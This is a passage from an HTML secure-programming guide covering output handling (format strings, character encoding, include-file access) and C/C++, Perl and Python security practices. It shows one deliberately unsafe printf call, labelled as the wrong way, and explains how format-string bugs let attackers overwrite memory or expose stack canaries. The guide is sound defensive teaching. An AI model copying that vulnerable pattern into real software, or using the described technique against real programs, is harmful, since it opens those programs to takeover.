It&#8217;s worth noting, however, that this is not as strong a defense
as you&#8217;d think, because often the
server itself can be subverted or broken.</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="OUTPUT"
></A
>Chapter 9. Send Information Back Judiciously</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>Do not answer a fool according to his folly,
or you will be like him yourself.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>Proverbs 26:4 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="MINIMIZE-FEEDBACK"
>9.1. Minimize Feedback</A
></H2
><P
>Avoid giving much information to untrusted users; simply succeed or fail,
and if it fails just say it failed and minimize information on why it failed.
In short, <EM
>minimize feedback</EM
>
to untrusted users if it might compromise security,
and instead send the detailed information to audit trail logs.
For example:</P
><P
></P
><UL
><LI
><P
>If your program requires some sort of user authentication
(e.g., you&#8217;re writing a network service or login program),
give the user as little information as possible before they authenticate.
In particular, avoid giving away the version number of your program
before authentication.
Otherwise,
if a particular version of your program is found to have a vulnerability,
then users who don&#8217;t upgrade from that version advertise to attackers that
they are vulnerable.</P
></LI
><LI
><P
>If your program accepts a password, don&#8217;t echo it back;
this creates another way passwords can be seen.</P
></LI
></UL
><P
>I recommend implementing audit logging early in development.
Audit logs are really convenient for debugging
(because they are designed to record useful information without
interfering with normal operations), and you are more likely to
include useful status information in the logs if they are developed
in parallel with the rest of the program.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="NO-COMMENTS"
>9.2. Don&#8217;t Include Comments</A
></H2
><P
>When returning information, don&#8217;t include any <SPAN
CLASS="QUOTE"
>&#8220;comments&#8221;</SPAN
> unless you&#8217;re
sure you want the receiving user to be able to view them.
This is a particular problem for web applications that generate files
(such as HTML).
Often web application programmers wish to comment their work
(which is fine), but instead of simply leaving the comment in their code,
the comment is included as part of the generated file (usually HTML or XML)
that is returned to the user.
The trouble is that these comments sometimes provide insight into how
the system works in a way that aids attackers.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="HANDLE-FULL-OUTPUT"
>9.3. Handle Full/Unresponsive Output</A
></H2
><P
>It may be possible for a user to clog or make unresponsive a secure
program&#8217;s output channel back to that user.
For example, a web browser could be intentionally halted or have its
TCP/IP channel response slowed.
The secure program should handle such cases, in particular it should release
locks quickly (preferably before replying) so that this will not create
an opportunity for a Denial-of-Service attack.
Always place time-outs on outgoing network-oriented write requests.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="CONTROL-FORMATTING"
>9.4. Control Data Formatting (Format Strings)</A
></H2
><P
>A number of output routines in computer languages have a
parameter that controls the generated format, e.g.,
a <EM
>format string</EM
>
language.
In C, the most obvious example is the printf() family of routines
(including printf(), sprintf(), snprintf(), fprintf(), and so on).
Other examples in C include syslog() (which writes system log information)
and setproctitle() (which sets the string used to display
process identifier information).
Many functions with names beginning with <SPAN
CLASS="QUOTE"
>&#8220;err&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;warn&#8221;</SPAN
>, containing
<SPAN
CLASS="QUOTE"
>&#8220;log&#8221;</SPAN
> , or ending in <SPAN
CLASS="QUOTE"
>&#8220;printf&#8221;</SPAN
> are worth considering.
Python includes the "%" operation, which on strings controls formatting
in a similar manner.
Many programs and libraries define formatting functions, often by
calling built-in routines and doing additional processing
(e.g., glib&#8217;s g_snprintf() routine).</P
><P
>Format languages are essentially little programming languages - so
developers who let attackers control the format string are essentially
running programs written by attackers!
Surprisingly, many people seem to forget the power of these formatting
capabilities, and use data from untrusted users as the formatting parameter.
The guideline here is clear -
never use unfiltered data from an untrusted user as the format parameter.
Failing to follow this guideline usually results in a
format string vulnerability (also called a formatation vulnerability).
Perhaps this is best shown by example:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>  /* Wrong way: */
  printf(string_from_untrusted_user);
  /* Right ways: */
  printf("%s", string_from_untrusted_user); /* safe */
  fputs(string_from_untrusted_user); /* better for simple strings */</PRE
></FONT
></TD
></TR
></TABLE
></P
><P
>If an attacker controls the formatting information,
an attacker can cause all sorts of mischief by carefully
selecting the format.
The case of C&#8217;s printf() is a good example -
there are lots of ways to possibly exploit user-controlled format strings
in printf().
These include
buffer overruns by creating a long formatting string (this can
result in the attacker having complete control over the program),
conversion specifications that use unpassed parameters
(causing unexpected data to be inserted), and
creating formats which produce totally unanticipated result values
(say by prepending or appending awkward data,
causing problems in later use).
A particularly nasty case is printf&#8217;s
%n conversion specification, which writes the
number of characters written so far into the pointer argument; 
using this, an attacker can overwrite a value that was intended for printing!
An attacker can even overwrite almost arbitrary locations, since the attacker
can specify a <SPAN
CLASS="QUOTE"
>&#8220;parameter&#8221;</SPAN
> that wasn&#8217;t actually passed.
The %n conversion specification has been standard part of C since its
beginning, is required by all C standards, and is used by real programs.
In 2000, Greg KH did a quick search of source code and identified the programs
BitchX (an irc client), Nedit (a program editor), and
SourceNavigator (a program editor / IDE / Debugger) as using %n, and there
are doubtless many more.
Deprecating %n would probably be a good idea, but even without %n there
can be significant problems.
Many papers discuss these attacks in more detail, for example, you can see
<A
HREF="http://www-syntim.inria.fr/fractales/Staff/Raynal/LinuxMag/SecProg/Art4/index.html"
TARGET="_top"
>Avoiding security holes
when developing an application - Part 4: format strings</A
>.</P
><P
>Since in many cases the results are sent back to the user,
this attack can also be used to expose internal information about the stack.
This information can then be used to circumvent stack protection systems
such as StackGuard and ProPolice; StackGuard uses constant <SPAN
CLASS="QUOTE"
>&#8220;canary&#8221;</SPAN
> values
to detect attacks, but if the stack&#8217;s contents can be displayed,
the current value of the canary will be exposed, suddenly making the
software vulnerable again to stack smashing attacks.</P
><P
>A formatting string should almost always be a constant string,
possibly involving a function call to implement a
lookup for internationalization (e.g., via gettext&#8217;s _()).
Note that this
lookup must be limited to values that the program controls, i.e., the
user must be allowed to only select from the message files controlled
by the program.
It&#8217;s possible to filter user data before using it (e.g., by designing
a filter listing legal characters for the format string such as [A-Za-z0-9]),
but it&#8217;s usually better to simply prevent the problem
by using a constant format string or fputs() instead.
Note that although I&#8217;ve listed this as an <SPAN
CLASS="QUOTE"
>&#8220;output&#8221;</SPAN
> problem, this can
cause problems internally to a program before output
(since the output routines may be saving to a file, or even just generating
internal state such as via snprintf()).</P
><P
>The problem of input formatting causing security problems
is not an idle possibility; see CERT Advisory CA-2000-13
for an example of an exploit using this weakness.
For more information on how these problems can be exploited, see
Pascal Bouchareine&#8217;s email article titled <SPAN
CLASS="QUOTE"
>&#8220;[Paper] Format bugs&#8221;</SPAN
>,
published in the July 18, 2000 edition of
<A
HREF="http://www.securityfocus.com"
TARGET="_top"
>Bugtraq</A
>.
As of December 2000,
developmental versions of the gcc compiler support warning messages for
insecure format string usages, in an attempt to help developers avoid
these problems.</P
><P
>Of course, this all begs the question as to whether or not the
internationalization lookup is, in fact, secure.
If you&#8217;re creating your own internationalization lookup routines,
make sure that an untrusted user can only specify a legal locale and not
something else like an arbitrary path.</P
><P
>Clearly, you want to limit the strings created through internationalization
to ones you can trust.
Otherwise, an attacker could use this ability to exploit the
weaknesses in format strings, particularly in C/C++ programs.
This has been an item of discussion in Bugtraq (e.g., see
John Levon&#8217;s Bugtraq post on July 26, 2000).
For more information, see the discussion on
permitting users to only select legal language values in
<A
HREF="#LOCALE-LEGAL-VALUES"
>Section 5.10.3</A
>.</P
><P
>Although it&#8217;s really a programming bug, it&#8217;s worth mentioning that
different countries notate numbers in different ways, in particular,
both the period (.) and comma (,) are used to separate an integer
from its fractional part.  If you save or load data, you need to make sure
that the active locale does not interfere with data handling.
Otherwise, a French user may not be able to exchange data with an
English user, because the data stored and retrieved will use
different separators.
I&#8217;m unaware of this being used as a security problem, but it&#8217;s conceivable.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="OUTPUT-CHARACTER-ENCODING"
>9.5. Control Character Encoding in Output</A
></H2
><P
>In general, a secure program must ensure that it synchronizes its
clients to any assumptions made by the secure program.
One issue often impacting web applications is that they forget to
specify the character encoding of their output.
This isn&#8217;t a problem if all data is from trusted sources, but if
some of the data is from untrusted sources, the untrusted source may
sneak in data that uses a different encoding than the one expected
by the secure program.
This opens the door for a cross-site malicious content attack; see
<A
HREF="#INPUT-PROTECTION-CROSS-SITE"
>Section 5.12</A
> for more information.</P
><P
><A
HREF="http://www.cert.org/tech_tips/malicious_code_mitigation.html"
TARGET="_top"
>CERT&#8217;s tech tip on malicious code mitigation</A
> explains the problem
of unspecified character encoding fairly well, so I quote it here:

<A
NAME="AEN2508"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>Many web pages leave the character encoding
("charset" parameter in HTTP) undefined.
In earlier versions of HTML and HTTP, the character encoding
was supposed to default to ISO-8859-1 if it wasn&#8217;t defined.
In fact, many browsers had a different default, so it was not possible
to rely on the default being ISO-8859-1.
HTML version 4 legitimizes this - if the character encoding isn&#8217;t specified,
any character encoding can be used.</P
><P
>If the web server doesn&#8217;t specify which character encoding is in use,
it can&#8217;t tell which characters are special.
Web pages with unspecified character encoding work most of the time
because most character sets assign the same characters to byte values
below 128.
But which of the values above 128 are special?
Some 16-bit character-encoding schemes have additional
multi-byte representations for special characters such as "&#60;".
Some browsers recognize this alternative encoding and act on it.
This is "correct" behavior, but it makes attacks using malicious scripts
much harder to prevent.
The server simply doesn&#8217;t know which byte sequences
represent the special characters.</P
><P
>For example, UTF-7 provides alternative encoding for "&#60;" and "&#62;",
and several popular browsers recognize these as the start and end of a tag.
This is not a bug in those browsers.
If the character encoding really is UTF-7, then this is correct behavior.
The problem is that it is possible to get into a situation in which
the browser and the server disagree on the encoding. </P
></BLOCKQUOTE
></P
><P
>Thankfully, though explaining the issue is tricky, its resolution in HTML
is easy.
In the HTML header, simply specify the charset, like this example
from CERT:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
>&#60;HTML&#62;
&#60;HEAD&#62;
&#60;META http-equiv="Content-Type"
content="text/html; charset=ISO-8859-1"&#62;
&#60;TITLE&#62;HTML SAMPLE&#60;/TITLE&#62;
&#60;/HEAD&#62;
&#60;BODY&#62;
&#60;P&#62;This is a sample HTML page
&#60;/BODY&#62;
&#60;/HTML&#62;</PRE
></FONT
></TD
></TR
></TABLE
>&#13;</P
><P
>From a technical standpoint,
an even better approach is to set the character encoding as part of
the HTTP protocol output, though some libraries make this more difficult.
This is technically better because it doesn&#8217;t force the client to
examine the header to determine a character encoding that would enable it
to read the META information in the header.
Of course, in practice a browser that couldn&#8217;t read the META information
given above and use it correctly would not succeed in the marketplace,
but that&#8217;s a different issue.
In any case, this just means that the server would need to send
as part of the HTTP protocol, a <SPAN
CLASS="QUOTE"
>&#8220;charset&#8221;</SPAN
> with the desired value.
Unfortunately, it&#8217;s hard to heartily recommend this (technically better)
approach, because some older HTTP/1.0 clients did not deal properly with
an explicit charset parameter.
Although the HTTP/1.1 specification requires clients to obey the parameter,
it&#8217;s suspicious enough that you probably ought to use it as an
adjunct to forcing the use of the correct
character encoding, and not your sole mechanism.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PREVENT-INCLUDE-ACCESS"
>9.6. Prevent Include/Configuration File Access</A
></H2
><P
>When developing web based applications,
do not allow users to access (read) files such as the program include and
configuration files.
This data may provide enough information (e.g., passwords) to break into
the system.
Note that this guideline sometimes also applies to other kinds of applications.
There are several actions you can take to do this, including:
<P
></P
><UL
><LI
><P
>Place
the include/configuration files outside of the web documentation
root (so that the web server will never serve the files).
Really, this is the best approach unless there&#8217;s some reason the
files have to be inside the document root.</P
></LI
><LI
><P
>Configure the web server so it will not serve include files as
text.  For example, if you&#8217;re using Apache,
you can add a handler or an action for .inc files like so:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> &#60;Files *.inc&#62;
   Order allow,deny
   Deny from all
 &#60;/Files&#62;</PRE
></FONT
></TD
></TR
></TABLE
></P
></LI
><LI
><P
>Place the include files
in a protected directory (using .htaccess), and designate them as files
that won&#8217;t be served.</P
></LI
><LI
><P
>Use a filter to deny access to the files.
For Apache, this can be done using:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="90%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> &#60;Files ~ "\.phpincludes"&#62;
    Order allow,deny
    Deny from all
 &#60;/Files&#62;</PRE
></FONT
></TD
></TR
></TABLE
>
If you need full regular expressions to match filenames, in Apache you
could use the FilesMatch directive.</P
></LI
><LI
><P
>If your include file is a valid script file,
which your server will parse,
make sure that it doesn&#8217;t act on user-supplied parameters and that it&#8217;s
designed to be secure.</P
></LI
></UL
></P
><P
>These approaches won&#8217;t protect you from users who
have access to the directories your files are in if they are world-readable.
You could change the permissions of the files so
that only the uid/gid of the webserver can read these files.
However, this approach won&#8217;t work if the user can get the web server to
run his own scripts (the user can just write scripts to access your files).
Fundamentally, if your site is being hosted on a server shared with
untrusted people, it&#8217;s harder to secure the system.
One approach is to run multiple web serving programs, each with different
permissions; this provides more security but is painful in practice.
Another approach is to set these files to be read only by your uid/gid,
and have the server run scripts at <SPAN
CLASS="QUOTE"
>&#8220;your&#8221;</SPAN
> permission.
This latter approach has its own problems: it means that certain parts of
the server must have root privileges, and that the script may
have more permissions than necessary.</P
></DIV
></DIV
><DIV
CLASS="CHAPTER"
><HR><H1
><A
NAME="LANGUAGE-SPECIFIC"
></A
>Chapter 10. Language-Specific Issues</H1
><TABLE
BORDER="0"
WIDTH="100%"
CELLSPACING="0"
CELLPADDING="0"
CLASS="EPIGRAPH"
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="LEFT"
VALIGN="TOP"
><I
><P
><I
>Undoubtedly there are all sorts of languages in the world,
yet none of them is without meaning.</I
></P
></I
></TD
></TR
><TR
><TD
WIDTH="45%"
>&nbsp;</TD
><TD
WIDTH="45%"
ALIGN="RIGHT"
VALIGN="TOP"
><I
><SPAN
CLASS="ATTRIBUTION"
>1 Corinthians 14:10 (NIV)</SPAN
></I
></TD
></TR
></TABLE
><P
>The issues discussed in the rest of this book generally apply to all
languages (though some are more common, or not present, in particular
languages).
However, there are also many language-specific security issues.
Many of them can be summarized as follows:
<P
></P
><UL
><LI
><P
>Turn on all relevant warnings and protection mechanisms available to you
where practical.
For compiled languages, this includes
both compile-time mechanisms and run-time mechanisms.
In general, security-relevant programs should compile cleanly with
all warnings turned on.</P
></LI
><LI
><P
>If you can use a <SPAN
CLASS="QUOTE"
>&#8220;safe mode&#8221;</SPAN
> (e.g., a mode that limits the activities
of the executable), do so.
Many interpreted languages include such a mode.
In general, don&#8217;t depend on the safe mode to provide absolute protection;
most language&#8217;s safe modes have not been sufficiently analyzed for their
security, and when they are, people usually discover many ways to exploit it.
However, by writing your code so that it&#8217;s secure out of safe mode, and
then adding the safe mode, you end up with defense-in-depth (since in
many cases, an attacker has to break both
your application code and the safe mode).</P
></LI
><LI
><P
>Avoid dangerous and deprecated operations in the language.
By <SPAN
CLASS="QUOTE"
>&#8220;dangerous&#8221;</SPAN
>, I mean operations which are difficult to use correctly.
For example, many languages include
some mechanisms or functions that are <SPAN
CLASS="QUOTE"
>&#8220;magical&#8221;</SPAN
>, that
is, they try to infer the <SPAN
CLASS="QUOTE"
>&#8220;right&#8221;</SPAN
> thing to do using a heuristic -
generally you should avoid them, because an attacker may be able to
exploit the heuristic and do something dangerous instead of what was intended.
A common error is an <SPAN
CLASS="QUOTE"
>&#8220;off-by-one&#8221;</SPAN
> error, in which the bound is
off by one, and sometimes these result in exploitable errors.
In general, write code in a way that minimizes the likelihood of
off-by-one errors.
If there are standard conventions in the language (e.g., for writing loops),
use them.</P
></LI
><LI
><P
>Ensure that the languages&#8217;
infrastructure (e.g., run-time library) is available and secured.</P
></LI
><LI
><P
>Languages that automatically garbage-collect strings should be
especially careful to immediately erase secret data
(in particular secret keys and passwords).</P
></LI
><LI
><P
>Know precisely the semantics of the operations that you are using.
Look up each operation&#8217;s semantics in its documentation.
Do not ignore return values unless you&#8217;re sure they cannot be relevant.
Don&#8217;t ignore the difference between <SPAN
CLASS="QUOTE"
>&#8220;signed&#8221;</SPAN
> and <SPAN
CLASS="QUOTE"
>&#8220;unsigned&#8221;</SPAN
> values.
This is particularly difficult in languages which don&#8217;t support exceptions,
like C, but that&#8217;s the way it goes.</P
></LI
></UL
></P
><P
>Here are some of the key issues for specific languages.
However, do not forget the issues discussed elsewhere.
For example, most languages have a formatting library, so be careful
to ensure that an attacker cannot control the format commands
(see <A
HREF="#CONTROL-FORMATTING"
>Section 9.4</A
> for more information).</P
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="C-CPP"
>10.1. C/C++</A
></H2
><P
>It is possible to develop secure code using C or C++, but both
languages include fundamental design decisions that make it
more difficult to write secure code.
C and C++ easily permit buffer overflows, force programmers to do their
own memory management, and are fairly lax in their typing systems.
For systems programs (such as an operating system kernel),
C and C++ are fine choices.
For applications, C and C++ are often over-used.
Strongly consider using an even higher-level language,
at least for the majority of the application.
But clearly, there are many existing programs in C and C++
which won&#8217;t get completely rewritten, and many developers may choose
to develop in C and C++.</P
><P
>One of the biggest security problems with C and C++ programs is
buffer overflow; see <A
HREF="#BUFFER-OVERFLOW"
>Chapter 6</A
>
for more information.
C has the additional weakness of not supporting exceptions, which makes
it easy to write programs that ignore critical error situations.</P
><P
>Another problem with C and C++ is that developers have to do their
own memory management (e.g., using malloc(), alloc(), free(), new, and delete),
and failing to do it correctly may result in a security flaw.
The more serious problem is that programs may erroneously
free memory that should not be freed (e.g., because it&#8217;s already been freed).
This can result in an immediate crash or be exploitable, allowing
an attacker to cause arbitrary code to be executed; see
[Anonymous Phrack 2001].
Some systems (such as many GNU/Linux systems) don&#8217;t protect
against double-freeing at all by default, and it is not clear that those
systems which attempt to protect themselves are truly unsubvertable.
Although I haven&#8217;t seen anything written on the subject, I suspect that
using the incorrect call in C++ (e.g., mixing new and malloc()) could
have similar effects.
For example, on March 11, 2002, it was announced that the zlib
library had this problem, affecting the many programs that use it.
Thus, when testing programs on GNU/Linux,
you should set the environment variable
MALLOC_CHECK_ to 1 or 2, and you might consider executing your program
with that environment variable set with 0, 1, 2.
The reason for this variable is explained in GNU/Linux malloc(3) man page:
<A
NAME="AEN2568"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>Recent versions of Linux libc (later than 5.4.23) and
GNU libc (2.x) include a malloc implementation which is tunable
via environment variables.
When MALLOC_CHECK_ is set, a special (less efficient) implementation
is used which is designed to be tolerant against simple errors,
such as double calls of free() with the same argument,
or overruns of a single byte (off-by-one bugs).
Not all such errors can be protected against, however, and memory leaks
can result.
If MALLOC_CHECK_ is set to 0, any detected heap corruption
is silently ignored;
if set to 1, a diagnostic is printed on stderr;
if set to 2, abort() is called immediately.
This can be useful because otherwise a crash may happen much later,
and the true cause for the problem is then very hard to track down. </P
></BLOCKQUOTE
>
There are various tools to deal with this, such as
Electric Fence and Valgrind;
see <A
HREF="#TOOLS"
>Section 11.7</A
> for more information.
If unused memory is not free&#8217;d, (e.g., using free()), that unused memory
may accumulate - and if enough unused memory can accumulate, the
program may stop working.
As a result, the unused memory may be exploitable by attackers to
create a denial of service.
It&#8217;s theoretically possible for attackers to cause memory to be
fragmented and cause a denial of service, but usually this
is a fairly impractical and low-risk attack.</P
><P
>Be as strict as you reasonably can when you declare types.
Where you can, use <SPAN
CLASS="QUOTE"
>&#8220;enum&#8221;</SPAN
> to define enumerated values (and not
just a <SPAN
CLASS="QUOTE"
>&#8220;char&#8221;</SPAN
> or <SPAN
CLASS="QUOTE"
>&#8220;int&#8221;</SPAN
> with special values).
This is particularly useful for values in switch statements, where
the compiler can be used to determine if all legal values have been covered.
Where it&#8217;s appropriate, use <SPAN
CLASS="QUOTE"
>&#8220;unsigned&#8221;</SPAN
> types if the value can&#8217;t be
negative.</P
><P
>One complication in C and C++ is that the character type <SPAN
CLASS="QUOTE"
>&#8220;char&#8221;</SPAN
> can be
signed or unsigned, depending on the compiler and machine;
the C standard permits either.
When a signed char with its high bit set
is saved in an integer, the result will be a negative number;
in some cases this can be exploitable.
In general, use <SPAN
CLASS="QUOTE"
>&#8220;unsigned char&#8221;</SPAN
> instead of char or signed char for
buffers, pointers, and casts when
dealing with character data that may have values greater than 127 (0x7f).
And when compiling, try to invoke a compiler option that forces
unspecified "char"s to be unsigned.
Portable programs shouldn&#8217;t depend on whether a char is signed or not,
and by forcing it to be unsigned, the resulting executable can avoid a
few nasty security vulnerabilities.
In gcc, you can make this happen using the "-funsigned-char" option.</P
><P
>C and C++ are by definition rather lax in their type-checking support, but
you can at least increase their level of checking so that some mistakes
can be detected automatically.
Turn on as many compiler warnings as you can and change the code to cleanly
compile with them, and strictly use ANSI prototypes in separate header
(.h) files to ensure that all function calls use the correct types.
For C or C++ compilations using gcc, use at least
the following as compilation flags (which turn on a host of warning messages)
and try to eliminate all warnings (note that -O2 is used since some
warnings can only be detected by the data flow analysis performed at
higher optimization levels):
<TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>gcc -Wall -Wpointer-arith -Wstrict-prototypes -O2</PRE
></FONT
></TD
></TR
></TABLE
>
Doc Shankar (of IBM) recommends the following set of compiler options
when using gcc; it may take some effort to make existing programs conform
to all these checks, but these checks can also help find a number problems:
<TABLE
BORDER="1"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="SCREEN"
>gcc -Werror -Wall \
    -Wmissing-prototypes -Wmissing-declarations \
    -Wstrict-prototypes -Wpointer-arith \
    -Wwrite-strings -Wcast-qual -Wcast-align \
    -Wbad-function-cast \
    -Wformat-security  -Wformat-nonliteral \
    -Wmissing-format-attribute \
    -Winline</PRE
></FONT
></TD
></TR
></TABLE
>

You might want <SPAN
CLASS="QUOTE"
>&#8220;-W -pedantic&#8221;</SPAN
> too.
Remember to add the "-funsigned-char" option to this set.</P
><P
>Many C/C++ compilers can detect inaccurate format strings.
For example,
gcc can warn about inaccurate format strings for functions you create
if you use its __attribute__() facility (a C extension) to mark such functions,
and you can use that facility without making your code non-portable.
Here is an example of what you&#8217;d put in your header (.h) file:
<TABLE
BORDER="0"
BGCOLOR="#E0E0E0"
WIDTH="100%"
><TR
><TD
><FONT
COLOR="#000000"
><PRE
CLASS="PROGRAMLISTING"
> /* in header.h */
 #ifndef __GNUC__
 #  define __attribute__(x) /*nothing*/
 #endif

 extern void logprintf(const char *format, ...)
    __attribute__((format(printf,1,2)));
 extern void logprintva(const char *format, va_list args)
    __attribute__((format(printf,1,0)));</PRE
></FONT
></TD
></TR
></TABLE
>
The "format" attribute takes either "printf" or "scanf", and the numbers
that follow are the parameter number of the format string and the first
variadic parameter (respectively). The GNU docs talk about this well.
Note that there are other __attribute__ facilities as well,
such as "noreturn" and "const".</P
><P
>Avoid common errors made by C/C++ developers.
Using warning systems and
style checkers can help avoid common errors.
For example, be careful about not using <SPAN
CLASS="QUOTE"
>&#8220;=&#8221;</SPAN
> when you mean <SPAN
CLASS="QUOTE"
>&#8220;==&#8221;</SPAN
>.
The gcc compiler&#8217;s -Wall option, recommended above,
turns on a -Wparenthesis option.
This -Wparenthesis option
warns you when incorrectly use "=", and requires adding extra parentheses
if you really mean to use "=").</P
><P
>Some organizations have defined a subset of a well-known language
to try to make common mistakes in it either impossible or more obvious.
One better-known subset of C
is the MISRA C guidelines [MISRA 1998].
If you intend to use a subset, it&#8217;s wise to use automated tools to check
if you&#8217;ve actually used only a subset.
There&#8217;s a proprietary tool called
<A
HREF="http://www.oakcomp.co.uk/SCT_About.html"
TARGET="_top"
>Safer C</A
> that checks code to see
if it meets most of the MISRA C requirements (it&#8217;s not quite 100%,
because some MISRA C requirements are difficult to check automatically).</P
><P
>Other approaches include building many more safety checks into the language,
or changing the language itself into a variant dialect that
is hopefully easier to write secure programs in.
have not had any experience using them:
The Safe C Compiler (SCC) is a C-to-C compiler that
adds extended pointer and array access semantics to automatically
detect memory access errors.
Its <A
HREF="http://www.cs.wisc.edu/~austin/scc.html"
TARGET="_top"
>front page</A
>
and
<A
HREF="http://www.cs.wisc.edu/~austin/talk.scc"
TARGET="_top"
>talk</A
> provide
interesting information, but its distribution appears limited as of 2004.
<A
HREF="http://www.research.att.com/projects/cyclone"
TARGET="_top"
>Cyclone</A
>
is a variant of C with far more "compile-time, link-time, and run-time checks
designed to ensure safety"
(where they define safe as free of crashes, buffer overflows, format string
attacks, and some other problems).
At this point you&#8217;re really starting to use a different (though similar)
language, and you should carefully decide on a language before its use.</P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PERL"
>10.2. Perl</A
></H2
><P
>Perl programmers should first read the man page perlsec(1), 
which describes a number of issues involved with writing secure programs
in Perl.
In particular, perlsec(1) describes the <SPAN
CLASS="QUOTE"
>&#8220;taint&#8221;</SPAN
> mode, which most
secure Perl programs should use.
Taint mode is automatically enabled if the real and effective user or group
IDs differ, or you can use the -T command line flag
(use the latter if you&#8217;re running on behalf of someone else, e.g.,
a CGI script).
Taint mode turns on various checks, such as checking
path directories to make sure they aren&#8217;t writable by others.</P
><P
>The most obvious affect of taint mode, however, is that
you may not use data derived from outside your program to
affect something else outside your program by accident.
In taint mode,
all externally-obtained input is marked as <SPAN
CLASS="QUOTE"
>&#8220;tainted&#8221;</SPAN
>, including
command line arguments, environment variables,
locale information (see perllocale(1)),
results of certain system calls (readdir, readlink,
the gecos field of getpw* calls), and all file input.
Tainted data may not be
used directly or indirectly in any command that invokes a
sub-shell, nor in any command that modifies files,
directories, or processes.
There is one important exception: If you
pass a list of arguments to either system or exec, the
elements of that list are NOT checked for taintedness, so
be especially careful with system or exec while in taint mode.</P
><P
>Any data value derived from tainted data becomes tainted also.
There is one exception to this; the way to untaint data is to
extract a substring of the tainted data.
Don&#8217;t just use <SPAN
CLASS="QUOTE"
>&#8220;.*&#8221;</SPAN
> blindly as your substring, though, since this
would defeat the tainting mechanism&#8217;s protections.
Instead, identify patterns that identify the <SPAN
CLASS="QUOTE"
>&#8220;safe&#8221;</SPAN
> pattern
allowed by your program, and use them to extract <SPAN
CLASS="QUOTE"
>&#8220;good&#8221;</SPAN
> values.
After extracting the value, you may still need to check it
(in particular for its length).</P
><P
>The open, glob, and backtick functions
call the shell to expand filename wild card characters; this
can be used to open security holes.
You can try to avoid these functions entirely, or use them in a
less-privileged <SPAN
CLASS="QUOTE"
>&#8220;sandbox&#8221;</SPAN
> as described in perlsec(1).
In particular, backticks should be rewritten using the system() call
(or even better, changed entirely to something safer).</P
><P
>The perl open() function comes with, frankly, 
<SPAN
CLASS="QUOTE"
>&#8220;way too much magic&#8221;</SPAN
> for most secure programs; it interprets text
that, if not carefully filtered, can create lots of security problems.
Before writing code to open or lock a file, consult the perlopentut(1)
man page.
In most cases, sysopen() provides a safer (though more convoluted)
approach to opening a file.
<A
HREF="http://www.xray.mpe.mpg.de/mailing-lists/perl5-porters/2000-03/msg02596.html"
TARGET="_top"
>The new Perl 5.6 adds an open() call
with 3 parameters to turn off the magic behavior
without requiring the convolutions of sysopen()</A
>.</P
><P
>Perl programs should turn on the warning flag (-w), which warns of
potentially dangerous or obsolete statements.</P
><P
>You can also run Perl programs in a restricted environment.
For more information see the <SPAN
CLASS="QUOTE"
>&#8220;Safe&#8221;</SPAN
> module in the standard Perl
distribution.
I&#8217;m uncertain of the amount of auditing that this has undergone,
so beware of depending on this for security.
You might also investigate the <SPAN
CLASS="QUOTE"
>&#8220;Penguin Model for
Secure Distributed Internet Scripting&#8221;</SPAN
>, though at the time
of this writing the code and documentation seems to be unavailable.</P
><P
>Many installations include a setuid root version of perl named <SPAN
CLASS="QUOTE"
>&#8220;suidperl&#8221;</SPAN
>.
However, the perldelta man page version 5.6.1 recommends using sudo
instead, stating the following:
<A
NAME="AEN2615"
></A
><BLOCKQUOTE
CLASS="BLOCKQUOTE"
><P
>"Note that suidperl is neither built nor installed by default in
any recent version of perl.
Use of suidperl is highly discouraged.
If you think you need it, try alternatives such as sudo first.
See http://www.courtesan.com/sudo/".</P
></BLOCKQUOTE
></P
></DIV
><DIV
CLASS="SECT1"
><HR><H2
CLASS="SECT1"
><A
NAME="PYTHON"
>10.3. Python</A
></H2
><P
>As with any language,
beware of any functions which allow data to be executed as parts of
a program, to make sure an untrusted user can&#8217;t affect their input.
This includes exec(), eval(), and execfile()
(and frankly, you should check carefully any call to compile()).
The input() statement is also surprisingly dangerous.
[Watters 1996, 150].</P
><P
>Python programs with privileges that can be invoked by unprivileged users
(e.g., setuid/setgid programs)
must <EM
>not</EM
> import the <SPAN
CLASS="QUOTE"
>&#8220;user&#8221;</SPAN
> module.
